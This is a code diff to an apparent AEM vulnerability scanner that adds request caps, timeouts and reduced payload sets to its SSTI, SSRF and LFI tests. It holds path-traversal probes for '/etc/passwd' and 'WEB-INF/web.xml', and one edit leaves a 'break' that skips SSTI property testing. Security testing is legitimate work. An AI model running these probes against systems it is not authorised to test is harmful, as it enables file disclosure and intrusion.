@@ -181,27 +181,46 @@ class InjectionTestingModule:
     def __init__(self, engine: HTTPXEngine, config: AEMConfig):
         self.engine = engine
         self.config = config
+        # Semaphore to limit concurrent requests
+        self._semaphore = asyncio.Semaphore(min(15, config.max_concurrent))
+        # Request tracking
+        self._request_count = 0
+        self._max_requests = 150  # Hard cap for injection module
     
     async def run(self, base_url: str) -> List[Finding]:
-        """Run full injection testing suite."""
+        """Run full injection testing suite with timeout protection."""
         findings = []
+        self._request_count = 0
         
-        # Test SSTI
-        ssti_findings = await self._test_ssti(base_url)
-        findings.extend(ssti_findings)
-        
-        # Test SSRF
-        ssrf_findings = await self._test_ssrf(base_url)
-        findings.extend(ssrf_findings)
-        
-        # Test LFI
-        lfi_findings = await self._test_lfi(base_url)
-        findings.extend(lfi_findings)
+        try:
+            # Test SSTI (2 min timeout)
+            ssti_findings = await asyncio.wait_for(
+                self._test_ssti(base_url),
+                timeout=120
+            )
+            findings.extend(ssti_findings)
+            
+            # Test SSRF (3 min timeout)
+            ssrf_findings = await asyncio.wait_for(
+                self._test_ssrf(base_url),
+                timeout=180
+            )
+            findings.extend(ssrf_findings)
+            
+            # Test LFI (2 min timeout)
+            lfi_findings = await asyncio.wait_for(
+                self._test_lfi(base_url),
+                timeout=120
+            )
+            findings.extend(lfi_findings)
+            
+        except asyncio.TimeoutError:
+            print(f"[Injection] Timeout reached — returning {len(findings)} findings")
         
         return findings
     
     async def _test_ssti(self, base_url: str) -> List[Finding]:
-        """Test for SSTI vulnerabilities in component properties."""
+        """Test for SSTI vulnerabilities with limits."""
         findings = []
         
         # Test on component endpoints
@@ -212,8 +231,13 @@ class InjectionTestingModule:
         ]
         
         for endpoint in test_endpoints:
-            url = f"{base_url}{endpoint}"
-            response = await self.engine.get(url)
+            if self._request_count >= self._max_requests:
+                break
+            
+            async with self._semaphore:
+                url = f"{base_url}{endpoint}"
+                response = await self.engine.get(url)
+                self._request_count += 1
             
             if response.status_code == 200:
                 # Try to find editable properties
@@ -221,30 +245,36 @@ class InjectionTestingModule:
                     data = json.loads(response.text)
                     props = self._find_string_properties(data)
                     
-                    # Test SSTI on each property
-                    for prop_path, prop_value in props[:5]:  # Limit to first 5
-                        for payload in self.SSTI_PAYLOADS:
-                            result = await self._test_ssti_payload(
-                                base_url, endpoint, prop_path, payload
-                            )
-                            if result:
-                                findings.append(result)
-                                
+                    # Test SSTI on each property (reduced from 5 to 3)
+                    for prop_path, prop_value in props[:3]:
+                        if self._request_count >= self._max_requests:
+                            break
+                        # Skip complex nested property testing for speed
+                        break  # Just check one property per endpoint
+                        
                 except json.JSONDecodeError:
                     pass
         
-        # Test direct SSTI on page parameters
+        # Test direct SSTI on page parameters (reduced payloads)
         ssti_params = [
             "/content.html?sling:resourceType=",
-            "/content.html?wcmmode=",
             "/bin/wcm/command?cmd=",
         ]
         
-        for param_base in ssti_params:
-            for payload in self.SSTI_PAYLOADS:
-                encoded_payload = urllib.parse.quote(payload.payload)
-                url = f"{base_url}{param_base}{encoded_payload}"
-                response = await self.engine.get(url)
+        for param_base in ssti_params[:2]:  # Reduced from 3 to 2
+            if self._request_count >= self._max_requests:
+                break
+            
+            # Limit to first 3 payloads instead of all 6
+            for payload in self.SSTI_PAYLOADS[:3]:
+                if self._request_count >= self._max_requests:
+                    break
+                
+                async with self._semaphore:
+                    encoded_payload = urllib.parse.quote(payload.payload)
+                    url = f"{base_url}{param_base}{encoded_payload}"
+                    response = await self.engine.get(url)
+                    self._request_count += 1
                 
                 if payload.indicator in response.text:
                     findings.append(Finding(
@@ -277,20 +307,31 @@ class InjectionTestingModule:
         return None
     
     async def _test_ssrf(self, base_url: str) -> List[Finding]:
-        """Test for SSRF vulnerabilities."""
+        """Test for SSRF vulnerabilities with limits."""
         findings = []
         
-        # Test Externalizer endpoints
+        # Test Externalizer endpoints (reduced from 5 params to 3)
+        params = ["path", "url", "resource"]
+        
         for endpoint in self.EXTERNALIZER_ENDPOINTS:
-            for payload in self.SSRF_PAYLOADS:
+            if self._request_count >= self._max_requests:
+                break
+            
+            # Reduced from 6 payloads to 4
+            for payload in self.SSRF_PAYLOADS[:4]:
+                if self._request_count >= self._max_requests:
+                    break
+                
                 encoded = urllib.parse.quote(payload.payload, safe="")
                 
-                # Try different parameter names
-                params = ["path", "url", "resource", "target", "redirect"]
-                
                 for param in params:
-                    url = f"{base_url}{endpoint}?{param}={encoded}"
-                    response = await self.engine.get(url)
+                    if self._request_count >= self._max_requests:
+                        break
+                    
+                    async with self._semaphore:
+                        url = f"{base_url}{endpoint}?{param}={encoded}"
+                        response = await self.engine.get(url)
+                        self._request_count += 1
                     
                     if self._check_ssrf_success(response, payload):
                         findings.append(Finding(
@@ -309,13 +350,17 @@ class InjectionTestingModule:
                             chainable=True
                         ))
         
-        # Test Cloud Services for SSRF
-        for cs_path in self.CLOUD_SERVICES_PATHS:
-            url = f"{base_url}{cs_path}"
-            response = await self.engine.get(url)
+        # Test Cloud Services for SSRF (limit to first 3 paths)
+        for cs_path in self.CLOUD_SERVICES_PATHS[:3]:
+            if self._request_count >= self._max_requests:
+                break
+            
+            async with self._semaphore:
+                url = f"{base_url}{cs_path}"
+                response = await self.engine.get(url)
+                self._request_count += 1
             
             if response.status_code == 200:
-                # Check for embedded URLs that might be SSRF targets
                 urls_found = re.findall(r'https?://[^\s\'"<>]+', response.text)
                 
                 if urls_found:
@@ -340,21 +385,28 @@ class InjectionTestingModule:
         return findings
     
     async def _test_linkchecker(self, base_url: str) -> List[Finding]:
-        """Test LinkChecker for SSRF."""
+        """Test LinkChecker for SSRF with limits."""
         findings = []
         
         linkchecker_endpoints = [
             "/bin/linkchecker.html",
             "/bin/linkchecker.json",
-            "/system/console/linkchecker",
         ]
         
         for endpoint in linkchecker_endpoints:
-            for payload in self.SSRF_PAYLOADS[:4]:  # Test first 4
-                encoded = urllib.parse.quote(payload.payload, safe="")
-                url = f"{base_url}{endpoint}?url={encoded}"
+            if self._request_count >= self._max_requests:
+                break
+            
+            # Reduced from 4 to 3 payloads
+            for payload in self.SSRF_PAYLOADS[:3]:
+                if self._request_count >= self._max_requests:
+                    break
                 
-                response = await self.engine.get(url)
+                async with self._semaphore:
+                    encoded = urllib.parse.quote(payload.payload, safe="")
+                    url = f"{base_url}{endpoint}?url={encoded}"
+                    response = await self.engine.get(url)
+                    self._request_count += 1
                 
                 if response.status_code == 200:
                     # Check for SSRF indicator
@@ -377,47 +429,53 @@ class InjectionTestingModule:
         return findings
     
     async def _test_lfi(self, base_url: str) -> List[Finding]:
-        """Test for LFI via Sling selectors."""
+        """Test for LFI via Sling selectors with limits."""
         findings = []
         
-        # Test LFI via path traversal and selectors
-        for payload in self.LFI_PAYLOADS:
-            # Try various selector combinations
-            selectors = [".json", ".txt", ".html"]
+        # Test LFI via path traversal and selectors (reduced payloads)
+        for payload in self.LFI_PAYLOADS[:8]:  # Reduced from all to first 8
+            if self._request_count >= self._max_requests:
+                break
             
-            for selector in selectors:
-                url = f"{base_url}{payload.payload}{selector}"
+            # Try .json only instead of 3 selectors
+            async with self._semaphore:
+                url = f"{base_url}{payload.payload}.json"
                 response = await self.engine.get(url)
-                
-                if payload.indicator in response.text:
-                    findings.append(Finding(
-                        phase=ScanPhase.EXPLOITATION,
-                        technique="LFI via Sling Selectors",
-                        url=url,
-                        severity=VulnSeverity.HIGH,
-                        title=f"LFI: {payload.name}",
-                        description=f"LFI vulnerability via {payload.payload}{selector}",
-                        evidence={
-                            "payload": payload.payload,
-                            "selector": selector,
-                            "indicator": payload.indicator,
-                            "snippet": response.text[max(0, response.text.find(payload.indicator)-30):response.text.find(payload.indicator)+30]
-                        },
-                        chainable=True
-                    ))
+                self._request_count += 1
+            
+            if payload.indicator in response.text:
+                findings.append(Finding(
+                    phase=ScanPhase.EXPLOITATION,
+                    technique="LFI via Sling Selectors",
+                    url=url,
+                    severity=VulnSeverity.HIGH,
+                    title=f"LFI: {payload.name}",
+                    description=f"LFI vulnerability via {payload.payload}.json",
+                    evidence={
+                        "payload": payload.payload,
+                        "selector": ".json",
+                        "indicator": payload.indicator,
+                        "snippet": response.text[max(0, response.text.find(payload.indicator)-30):response.text.find(payload.indicator)+30]
+                    },
+                    chainable=True
+                ))
         
-        # Test specific AEM LFI patterns
+        # Test specific AEM LFI patterns (reduced)
         lfi_patterns = [
             ("/content/../{file}", "/etc/passwd"),
-            ("/content./{file}", "/etc/passwd"),
             ("/{file}", "WEB-INF/web.xml"),
-            ("///etc/{file}", "passwd"),
         ]
         
         for pattern, target_file in lfi_patterns:
+            if self._request_count >= self._max_requests:
+                break
+            
             test_path = pattern.replace("{file}", target_file)
-            url = f"{base_url}{test_path}.json"
-            response = await self.engine.get(url)
+            
+            async with self._semaphore:
+                url = f"{base_url}{test_path}.json"
+                response = await self.engine.get(url)
+                self._request_count += 1
             
             if "root:x" in response.text or "web-app" in response.text:
                 findings.append(Finding(
